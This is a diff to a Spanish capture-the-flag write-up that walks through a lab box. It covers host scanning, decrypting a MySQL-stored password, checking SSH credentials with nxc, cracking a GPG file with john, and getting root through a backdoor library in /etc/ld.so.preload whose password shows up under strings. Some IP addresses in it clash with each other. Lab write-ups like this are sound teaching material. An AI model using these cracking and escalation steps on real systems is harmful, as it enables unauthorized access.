@@ -109,7 +109,35 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.142 seconds (119.51 hosts/sec). 9 responded
 ```
 
-Encontramos nuestro objetivo y es: `192.168.110.10`.
+**Importante**: Recordemos que hay una segunda interfaz configurada en la máquina víctima, entonces, vamos a hacer el mismo porceso.
+
+Probemos primero con **nmap** en la segunda inferfaz:
+```bash
+nmap -sn 10.0.2.0/24
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-07 16:34 -0600
+...
+Nmap scan report for 10.0.1.10
+Host is up (0.00063s latency).
+MAC Address: XX (Oracle VirtualBox virtual NIC)
+...
+Nmap done: 256 IP addresses (4 hosts up) scanned in 10.93 seconds
+```
+
+Vamos a probar la herramienta **arp-scan**:
+```bash
+arp-scan -I eth1 -g 10.0.1.0/24
+Interface: eth1, type: EN10MB, MAC: XX, IPv4: Tu_IP
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+...
+10.0.1.10  XX  PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.007 seconds (127.55 hosts/sec). 3 responded
+```
+
+Encontramos nuestros objetivos y son: `192.168.110.10` y `10.0.1.10`.
+
+Nota: En ambos objetivos tienen los mismos puertos y servicios, por lo que de momento nos enfocaremos en solo 1, pero quizá esto cambie más adelante.
 
 <br>
 
@@ -543,6 +571,7 @@ MySQL [(none)]>
 
 <h2 id="MySQL">Enumeración del Servicio MySQL y Desencriptando Contraseña Almacenada en Base de Datos</h2>
 
+Veamos qué bases de datos existen:
 ```bash
 MySQL [(none)]> show databases;
 +--------------------+
@@ -554,7 +583,9 @@ MySQL [(none)]> show databases;
 +--------------------+
 3 rows in set (0.003 sec)
 ```
+Tenemos 1 base de datos llamada **SensorData** y las 2 BDs por defecto.
 
+Carguemos la BD **SensorData**:
 ```bash
 MySQL [(none)]> use SensorData;
 Reading table information for completion of table and column names
@@ -563,6 +594,7 @@ You can turn off this feature to get a quicker startup with -A
 Database changed
 ```
 
+Veamos las tablas existentes:
 ```bash
 MySQL [SensorData]> show tables;
 +------------------------+
@@ -574,7 +606,9 @@ MySQL [SensorData]> show tables;
 +------------------------+
 3 rows in set (0.002 sec)
 ```
+Vemos 3 tablas, pero la que nos interesa es la tabla login.
 
+Veamos su contenido:
 ```bash
 MySQL [SensorData]> select * from login;
 +----+---------------+------------------------------------------------------------------+
@@ -584,6 +618,8 @@ MySQL [SensorData]> select * from login;
 +----+---------------+------------------------------------------------------------------+
 1 row in set (0.002 sec)
 ```
+Excelente, tenemos la contraseña del usuario administrador, pero parece que es una contraseña encriptada.
+
 
 ```bash
 MySQL [SensorData]> show events from SensorData;
@@ -619,23 +655,41 @@ MySQL [SensorData]> SELECT AES_DECRYPT(UNHEX(password), 'encryption_key') FROM l
 ```
 
 ```bash
-
+nxc ssh 10.0.2.15 -u 'pepito' -p 'f578e4a9f649bcad'
+SSH         10.0.2.15       22     10.0.2.15        [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.13
+SSH         10.0.2.15       22     10.0.2.15        [+] pepito:f578e4a9f649bcad  Linux - Shell access!
 ```
 
 ```bash
+ssh pepito@10.0.2.15
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+pepito@10.0.2.15's password: 
+==================================================
+Has llegado al umbral de la última prueba... aquí no hay vuelta atrás.
 
+El tiempo se agota y esta vez no habrá segundas oportunidades.
+Solo los que realmente comprenden el valor de cada segundo podrán salir victoriosos.
+
+Dispones de 60 minutos para resolver el enigma que se cierne sobre ti.
+Cada decisión cuenta, cada error te acerca al abismo.
+
+No recibirás ayuda, ni pistas adicionales... solo el tic-tac implacable del reloj.
+Cuando el tiempo termine, este lugar quedará sellado para siempre.
+
+¿Tienes lo que se necesita para superar este reto?
+==================================================
+pepito@ctf:~$ whoami
+pepito
 ```
 
 ```bash
-
+pepito@ctf:~$ ls
+leeme.txt.gpg  user.txt
+pepito@ctf:~$ cat user.txt
+...
 ```
-
-```bash
-
-```
-
-
-
 
 
 <br>
@@ -650,7 +704,22 @@ MySQL [SensorData]> SELECT AES_DECRYPT(UNHEX(password), 'encryption_key') FROM l
 <h2 id=""></h2>
 
 ```bash
+gpg2john leeme.txt.gpg > hashGPG
+```
 
+```bash
+john -w:/usr/share/wordlists/rockyou.txt hashGPG
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+superman1        (?)     
+1g 0:00:00:38 DONE (2026-05-07 12:36) 0.02617g/s 29.37p/s 29.37c/s 29.37C/s superman1..rocku
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 ```
 
 ```bash
@@ -658,13 +727,107 @@ MySQL [SensorData]> SELECT AES_DECRYPT(UNHEX(password), 'encryption_key') FROM l
 ```
 
 ```bash
+cat leeme.txt
+No todas las funciones tienen el control que parecen tener. Algunas veces, quien controla lo que se **carga primero** tiene la ventaja. Recuerda: la pre-carga puede ser tu mejor aliada... o tu perdición.
+```
 
+<br>
+
+<h2 id=""></h2>
+
+```bash
+pepito@ctf:~$ ls -la
+total 52
+drwxr-xr-x 6 pepito pepito 4096 nov 23  2024 .
+drwxr-xr-x 3 root   root   4096 nov 23  2024 ..
+-rw------- 1 pepito pepito 2178 nov 23  2024 .bash_history
+-rw-r--r-- 1 pepito pepito  220 nov 16  2024 .bash_logout
+-rwxr-xr-x 1 root   root    758 nov 23  2024 .bash_profile
+-rw-r--r-- 1 pepito pepito 3801 nov 23  2024 .bashrc
+drwx------ 2 pepito pepito 4096 nov 16  2024 .cache
+drwxr-xr-x 3 root   root   4096 nov 18  2024 .config
+drwx------ 3 pepito pepito 4096 nov 18  2024 .gnupg
+-rw-r--r-- 1 root   root      0 nov 18  2024 .hushlogin
+-rw-r--r-- 1 root   root    225 nov 23  2024 leeme.txt.gpg
+-rw-r--r-- 1 pepito pepito  807 nov 16  2024 .profile
+drwx------ 2 pepito pepito 4096 nov 16  2024 .ssh
+-rw-r--r-- 1 pepito pepito   36 nov 23  2024 user.txt
 ```
 
 ```bash
-
+pepito@ctf:~$ cat .bash_history
+ls -la /etc/ld.so.preload
+cat /etc/ld.so.preload
 ```
 
+```bash
+pepito@ctf:~$ ls -la /etc/ld.so.preload
+-rw-r--r-- 1 root root 21 nov 23  2024 /etc/ld.so.preload
+pepito@ctf:~$ cat /etc/ld.so.preload
+/lib/libscaperoom.so
+pepito@ctf:~$ ls -la /lib/libscaperoom.so
+-rwxr-xr-x 1 root root 16912 nov 23  2024 /lib/libscaperoom.so
+```
+
+```bash
+strings /lib/libscaperoom.so | grep -i "rT8hQ9VcYb5kLmXo"
+strings /lib/libscaperoom.so | grep -i "secret"
+strings /lib/libscaperoom.so
+su
+whoami
+```
+
+```bash
+pepito@ctf:~$ strings /lib/libscaperoom.so
+__gmon_start__
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+...
+...
+/proc/%d/comm
+rT8hQ9VcYb5kLmXo
+[+] Acceso root concedido!
+[+] Reloj detenido... Buen trabajo!!!
+/bin/systemctl stop apagar_automatico.service
+/bin/bash
+:*3$"
+...
+...
+```
+
+```bash
+pepito@ctf:~$ su
+Password: 
+[+] Acceso root concedido!
+[+] Reloj detenido... Buen trabajo!!!
+root@ctf:~# root
+```
+
+```bash
+root@ctf:/root# ==================================================
+¡ENHORABUENA, INTRÉPIDO HACKER!
+
+Has logrado superar todos los desafíos y escapar de esta sala virtual. El tiempo no fue tu enemigo, 
+sino tu aliado, y cada decisión te ha llevado hasta este momento.
+
+La clave para tu victoria es:
+
+**********
+
+Esta flag es el símbolo de tu éxito y la prueba de que has alcanzado el nivel más alto de este reto. 
+Guarda este logro con orgullo, pues no todos pueden llegar tan lejos.
+
+Recuerda:
+- Cada pista que descifraste fue una lección valiosa.
+- Cada error que cometiste, una oportunidad de crecer.
+- Cada éxito, un paso más hacia el dominio.
+
+Esto no es el final, sino el comienzo de nuevos desafíos. ¿Estás preparado para lo que viene?
+
+¡Nos vemos en el próximo reto, donde tu ingenio será puesto a prueba una vez más!
+
+==================================================
+```
 
 
 
